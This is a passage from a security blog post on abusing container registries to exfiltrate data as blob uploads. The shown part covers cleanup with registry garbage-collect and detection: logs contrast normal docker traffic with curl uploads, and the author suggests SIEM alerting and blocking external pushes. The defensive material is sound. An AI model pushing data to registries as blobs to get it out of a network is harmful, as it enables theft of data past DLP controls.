</pre><td class="rouge-code"><pre>bin/registry garbage-collect <span class="o">[</span><span class="nt">--dry-run</span><span class="o">]</span> /path/to/config.yml
</pre></table></code></div></div><details> <summary>To find your rootdirectory for your yaml file run this</summary><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># cat /etc/docker/registry/config.yml</span>
version: 0.1
log:
  fields:
    service: registry
storage:
  cache:
    blobdescriptor: inmemory
  filesystem:
    rootdirectory: /var/lib/registry
http:
  addr: :5000
  headers:
    X-Content-Type-Options: <span class="o">[</span>nosniff]
health:
  storagedriver:
    enabled: <span class="nb">true
    </span>interval: 10s
    threshold: 3
  </code></pre></figure></details> <details> <summary>deletebadstuff.yml</summary><figure class="highlight"><pre><code class="language-yml" data-lang="yml"><span class="na">version</span><span class="pi">:</span> <span class="m">0.1</span>
<span class="na">storage</span><span class="pi">:</span>
  <span class="na">filesystem</span><span class="pi">:</span>
    <span class="na">rootdirectory</span><span class="pi">:</span> <span class="s">/var/lib/registry</span>
  </code></pre></figure></details><p>Here we ran the command and found the blob I uploaded and removed it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>/etc/docker/registry <span class="c"># registry garbage-collect /etc/docker/registry/deletebadstuff.yml</span>
my-ubuntu
my-ubuntu: marking manifest sha256:a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
my-ubuntu: marking blob sha256:b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
my-ubuntu: marking blob sha256:58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
my-ubuntu: marking blob sha256:b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
my-ubuntu: marking blob sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
my-ubuntu: marking blob sha256:fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
 
6 blobs marked, 1 blobs and 0 manifests eligible <span class="k">for </span>deletion
blob eligible <span class="k">for </span>deletion: sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf
INFO[0000] Deleting blob: /docker/registry/v2/blobs/sha256/46/4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf  go.version<span class="o">=</span>go1.11.2 instance.id<span class="o">=</span>7ae297a0-9007-45a9-95c8-1d7e83dcc634
</pre></table></code></div></div><p>Many modern containerization registries come with some sort of garbage collecting by default such as <a href="https://azure.microsoft.com/en-us/services/container-registry/">Azure’s Container Registry</a>, <a href="https://docs.gitlab.com/ee/user/packages/container_registry/">GitLab’s Container Registry</a>, and <a href="https://goharbor.io/">Harbor</a>. However most of the time these features are not turned on by default.</p><h2 id="logging"><span class="mr-2">Logging</span><a href="#logging" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Because we are using the API legitimately, that means that we are able to see all the API calls in the logs, as you can see below this is what regular traffic looks like many calls with GET, HEAD, and POST methods.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>192.168.40.1 - - <span class="o">[</span>22/Oct/2021:22:34:59 +0000] <span class="s2">"GET /v2/ HTTP/1.1"</span> 200 2 <span class="s2">""</span> <span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\\</span><span class="s2">(linux</span><span class="se">\\</span><span class="s2">))"</span>
<span class="nb">time</span><span class="o">=</span><span class="s2">"2021-10-22T22:34:59.838542408Z"</span> <span class="nv">level</span><span class="o">=</span>error <span class="nv">msg</span><span class="o">=</span><span class="s2">"response completed with error"</span> err.code<span class="o">=</span><span class="s2">"blob unknown"</span> err.detail<span class="o">=</span>sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 err.message<span class="o">=</span><span class="s2">"blob unknown to registry"</span> go.version<span class="o">=</span>go1.11.2 http.request.host<span class="o">=</span><span class="s2">"localhost:5000"</span> http.request.id<span class="o">=</span>c6748305-21fd-4bad-a5bc-f76f58dfa078 http.request.method<span class="o">=</span>HEAD http.request.remoteaddr<span class="o">=</span><span class="s2">"192.168.40.1:60128"</span> http.request.uri<span class="o">=</span><span class="s2">"/v2/my-ubuntu/blobs/sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1"</span> http.request.useragent<span class="o">=</span><span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\(</span><span class="s2">linux</span><span class="se">\)</span><span class="s2">)"</span> http.response.contenttype<span class="o">=</span><span class="s2">"application/json; charset=utf-8"</span> http.response.duration<span class="o">=</span>6.09934ms http.response.status<span class="o">=</span>404 http.response.written<span class="o">=</span>157 vars.digest<span class="o">=</span><span class="s2">"sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1"</span> vars.name<span class="o">=</span>my-ubuntu
192.168.40.1 - - <span class="o">[</span>22/Oct/2021:22:34:59 +0000] <span class="s2">"HEAD /v2/my-ubuntu/blobs/sha256:b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 HTTP/1.1"</span> 404 157 <span class="s2">""</span> <span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\\</span><span class="s2">(linux</span><span class="se">\\</span><span class="s2">))"</span>
192.168.40.1 - - <span class="o">[</span>22/Oct/2021:22:34:59 +0000] <span class="s2">"HEAD /v2/my-ubuntu/blobs/sha256:fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e HTTP/1.1"</span> 404 157 <span class="s2">""</span> <span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\\</span><span class="s2">(linux</span><span class="se">\\</span><span class="s2">))"</span>
192.168.40.1 - - <span class="o">[</span>22/Oct/2021:22:34:59 +0000] <span class="s2">"HEAD /v2/my-ubuntu/blobs/sha256:58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 HTTP/1.1"</span> 404 157 <span class="s2">""</span> <span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\\</span><span class="s2">(linux</span><span class="se">\\</span><span class="s2">))"</span>
<span class="nb">time</span><span class="o">=</span><span class="s2">"2021-10-22T22:34:59.862855296Z"</span> <span class="nv">level</span><span class="o">=</span>info <span class="nv">msg</span><span class="o">=</span><span class="s2">"response completed"</span> go.version<span class="o">=</span>go1.11.2 http.request.host<span class="o">=</span><span class="s2">"localhost:5000"</span> http.request.id<span class="o">=</span>90bcd815-28e4-4b10-88eb-7776c67cf385 http.request.method<span class="o">=</span>POST http.request.remoteaddr<span class="o">=</span><span class="s2">"192.168.40.1:60136"</span> http.request.uri<span class="o">=</span><span class="s2">"/v2/my-ubuntu/blobs/uploads/"</span> http.request.useragent<span class="o">=</span><span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\(</span><span class="s2">linux</span><span class="se">\)</span><span class="s2">)"</span> http.response.duration<span class="o">=</span>27.498841ms http.response.status<span class="o">=</span>202 http.response.written<span class="o">=</span>0
192.168.40.1 - - <span class="o">[</span>22/Oct/2021:22:34:59 +0000] <span class="s2">"HEAD /v2/my-ubuntu/blobs/sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 HTTP/1.1"</span> 404 157 <span class="s2">""</span> <span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\\</span><span class="s2">(linux</span><span class="se">\\</span><span class="s2">))"</span>
192.168.40.1 - - <span class="o">[</span>22/Oct/2021:22:34:59 +0000] <span class="s2">"POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1"</span> 202 0 <span class="s2">""</span> <span class="s2">"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce </span><span class="se">\\</span><span class="s2">(linux</span><span class="se">\\</span><span class="s2">))"</span>
</pre></table></code></div></div><p>Here where we are uploading my blob through the API you can see that it’s mostly POST and PUTS, with no HEAD or GETS methods. We should be able to train our SIEM to look for this sort of pattern and alert us when this happens.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>10.0.1.68 - - <span class="o">[</span>23/Oct/2021:02:35:14 +0000] <span class="s2">"POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1"</span> 202 0 <span class="s2">""</span> <span class="s2">"curl/7.68.0"</span>
<span class="nb">time</span><span class="o">=</span><span class="s2">"2021-10-23T02:35:14.697725865Z"</span> <span class="nv">level</span><span class="o">=</span>error <span class="nv">msg</span><span class="o">=</span><span class="s2">"response completed with error"</span> err.code<span class="o">=</span><span class="s2">"digest invalid"</span> err.detail<span class="o">=</span><span class="s2">"digest parsing failed"</span> err.message<span class="o">=</span><span class="s2">"provided digest did not match uploaded content"</span> go.version<span class="o">=</span>go1.11.2 http.request.host<span class="o">=</span><span class="s2">"10.0.1.68:5000"</span> http.request.id<span class="o">=</span>c1b2df8e-2235-474e-a8ae-a4e9b0144366 http.request.method<span class="o">=</span>PUT http.request.remoteaddr<span class="o">=</span><span class="s2">"10.0.1.68:46056"</span> http.request.uri<span class="o">=</span><span class="s2">"/v2/my-ubuntu/blobs/uploads/69c54205-5f65-4319-8f73-ae3868970f75?_state=IAwESRbw7yI8SSgXKwXcC8acbxyao7VYfyzJGk_vFgZ7Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiNjljNTQyMDUtNWY2NS00MzE5LThmNzMtYWUzODY4OTcwZjc1IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM1OjE0LjY2OTU3OTQwMloifQ%3D%3D&amp;digest=4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf"</span> http.request.useragent<span class="o">=</span><span class="s2">"curl/7.68.0"</span> http.response.contenttype<span class="o">=</span><span class="s2">"application/json; charset=utf-8"</span> http.response.duration<span class="o">=</span>4.274777ms http.response.status<span class="o">=</span>400 http.response.written<span class="o">=</span>131 vars.name<span class="o">=</span>my-ubuntu vars.uuid<span class="o">=</span>69c54205-5f65-4319-8f73-ae3868970f75
10.0.1.68 - - <span class="o">[</span>23/Oct/2021:02:35:14 +0000] <span class="s2">"PUT /v2/my-ubuntu/blobs/uploads/69c54205-5f65-4319-8f73-ae3868970f75?_state=IAwESRbw7yI8SSgXKwXcC8acbxyao7VYfyzJGk_vFgZ7Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiNjljNTQyMDUtNWY2NS00MzE5LThmNzMtYWUzODY4OTcwZjc1IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM1OjE0LjY2OTU3OTQwMloifQ%3D%3D&amp;digest=4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf HTTP/1.1"</span> 400 131 <span class="s2">""</span> <span class="s2">"curl/7.68.0"</span>
10.0.1.68 - - <span class="o">[</span>23/Oct/2021:02:37:56 +0000] <span class="s2">"POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1"</span> 202 0 <span class="s2">""</span> <span class="s2">"curl/7.68.0"</span>
<span class="nb">time</span><span class="o">=</span><span class="s2">"2021-10-23T02:37:56.666705903Z"</span> <span class="nv">level</span><span class="o">=</span>info <span class="nv">msg</span><span class="o">=</span><span class="s2">"response completed"</span> go.version<span class="o">=</span>go1.11.2 http.request.host<span class="o">=</span><span class="s2">"10.0.1.68:5000"</span> http.request.id<span class="o">=</span>4f5d3d80-7239-4b49-ba04-dc99cce91017 http.request.method<span class="o">=</span>POST http.request.remoteaddr<span class="o">=</span><span class="s2">"10.0.1.68:46058"</span> http.request.uri<span class="o">=</span><span class="s2">"/v2/my-ubuntu/blobs/uploads/"</span> http.request.useragent<span class="o">=</span><span class="s2">"curl/7.68.0"</span> http.response.duration<span class="o">=</span>5.900598ms http.response.status<span class="o">=</span>202 http.response.written<span class="o">=</span>0
10.0.1.68 - - <span class="o">[</span>23/Oct/2021:02:37:56 +0000] <span class="s2">"PUT /v2/my-ubuntu/blobs/uploads/c4c17c99-a34b-4823-8e2f-d44388fd14e7?_state=q8GBvxM4lqcwqZdeq7mJLo4GYSJ5ViYXRdaYBu-fv057Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiYzRjMTdjOTktYTM0Yi00ODIzLThlMmYtZDQ0Mzg4ZmQxNGU3IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM3OjU2LjY2MjQwNDg5MVoifQ%3D%3D&amp;digest=sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf HTTP/1.1"</span> 201 0 <span class="s2">""</span> <span class="s2">"curl/7.68.0"</span>
<span class="nb">time</span><span class="o">=</span><span class="s2">"2021-10-23T02:37:56.682175203Z"</span> <span class="nv">level</span><span class="o">=</span>info <span class="nv">msg</span><span class="o">=</span><span class="s2">"response completed"</span> go.version<span class="o">=</span>go1.11.2 http.request.host<span class="o">=</span><span class="s2">"10.0.1.68:5000"</span> http.request.id<span class="o">=</span>1354f16b-7940-4ad3-ac4b-c42b54fdafdb http.request.method<span class="o">=</span>PUT http.request.remoteaddr<span class="o">=</span><span class="s2">"10.0.1.68:46060"</span> http.request.uri<span class="o">=</span><span class="s2">"/v2/my-ubuntu/blobs/uploads/c4c17c99-a34b-4823-8e2f-d44388fd14e7?_state=q8GBvxM4lqcwqZdeq7mJLo4GYSJ5ViYXRdaYBu-fv057Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiYzRjMTdjOTktYTM0Yi00ODIzLThlMmYtZDQ0Mzg4ZmQxNGU3IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM3OjU2LjY2MjQwNDg5MVoifQ%3D%3D&amp;digest=sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf"</span> http.request.useragent<span class="o">=</span><span class="s2">"curl/7.68.0"</span> http.response.duration<span class="o">=</span>5.954959ms http.response.status<span class="o">=</span>201 http.response.written<span class="o">=</span>0
</pre></table></code></div></div><h2 id="network"><span class="mr-2">Network</span><a href="#network" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Likewise at our network layet, either in our WAF’s or Firewalss we hould be validating that we can only push to our own internal container repositories and never an external one.</p><h1 id="resources">Resources</h1><ul><li>https://docs.docker.com/registry/spec/api/#blob-upload<li>https://github.com/distribution/distribution/issues/2867<li>https://docs.docker.com/registry/spec/api/</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/containerization/'>Containerization</a>, <a href='/categories/hacking/'>Hacking</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/containerization/" class="post-tag no-text-decoration" >containerization</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/dlp/" class="post-tag no-text-decoration" >dlp</a> <a href="/tags/data-exfiltration/" class="post-tag no-text-decoration" >data exfiltration</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=How+To+Abuse+Container+Repositories+For+Fun+And+Profit+-+Tamalerhino%27s+Blog&url=https%3A%2F%2Ftamalerhino.github.io%2Fposts%2Fhow-to-abuse-container-repositories-for-fun-and-profit%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=How+To+Abuse+Container+Repositories+For+Fun+And+Profit+-+Tamalerhino%27s+Blog&u=https%3A%2F%2Ftamalerhino.github.io%2Fposts%2Fhow-to-abuse-container-repositories-for-fun-and-profit%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftamalerhino.github.io%2Fposts%2Fhow-to-abuse-container-repositories-for-fun-and-profit%2F&text=How+To+Abuse+Container+Repositories+For+Fun+And+Profit+-+Tamalerhino%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/container-from-scratch/">Containers From Scratch Part 1</a><li><a href="/posts/systemd-namespace-containers/">Systemd Namespace Containers</a><li><a href="/posts/docker-debian-airgapped/">Install Docker Air Gapped</a><li><a href="/posts/docker-desktop-wsl2-deep-dive/">Docker Desktop WSL2 Deep Dive</a><li><a href="/posts/how-to-abuse-container-repositories-for-fun-and-profit/">How To Abuse Container Repositories For Fun And Profit</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/containerization/">containerization</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/docker-desktop/">docker desktop</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wsl2/">wsl2</a> <a class="post-tag" href="/tags/wsl/">wsl</a> <a class="post-tag" href="/tags/data-exfiltration/">data exfiltration</a> <a class="post-tag" href="/tags/devsecops/">devsecops</a> <a class="post-tag" href="/tags/dlp/">dlp</a> <a class="post-tag" href="/tags/hacking/">hacking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/docker-desktop-wsl2-deep-dive/"><div class="card-body"> <em class="small" data-ts="1633107600" data-df="ll" > Oct 1, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Docker Desktop WSL2 Deep Dive</h3><div class="text-muted small"><p> In the last few years theres been a big push for Docker Desktop on developer workstations, many of those workstations being Mac and Windows not Linux. But since containers need a Linux kernel to ru...</p></div></div></a></div><div class="card"> <a href="/posts/creating-a-custom-wsl2-image/"><div class="card-body"> <em class="small" data-ts="1636650000" data-df="ll" > Nov 11, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Creating A Custom WSL2 Image</h3><div class="text-muted small"><p> Recently with the usage of Docker Desktop, there has been a need to use WSL2 to run Docker Desktop on Windows. However because of the various security implications, missing security kernel modules,...</p></div></div></a></div><div class="card"> <a href="/posts/bootstrapping-debian-as-a-container-image-pt1/"><div class="card-body"> <em class="small" data-ts="1639328400" data-df="ll" > Dec 12, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bootstrapping Debian as a Container Image</h3><div class="text-muted small"><p> In my research to get away from docker and docker images i needed a way to learn to create a conatiner image. After all a container image is just a filesystem that has been neatly packaged. In the ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/docker-desktop-wsl2-deep-dive/" class="btn btn-outline-primary" prompt="Older"><p>Docker Desktop WSL2 Deep Dive</p></a> <a href="/posts/creating-a-custom-wsl2-image/" class="btn btn-outline-primary" prompt="Newer"><p>Creating A Custom WSL2 Image</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/tamalerhino">Ulises Galeano</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/containerization/">containerization</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/docker-desktop/">docker desktop</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wsl2/">wsl2</a> <a class="post-tag" href="/tags/wsl/">wsl</a> <a class="post-tag" href="/tags/data-exfiltration/">data exfiltration</a> <a class="post-tag" href="/tags/devsecops/">devsecops</a> <a class="post-tag" href="/tags/dlp/">dlp</a> <a class="post-tag" href="/tags/hacking/">hacking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
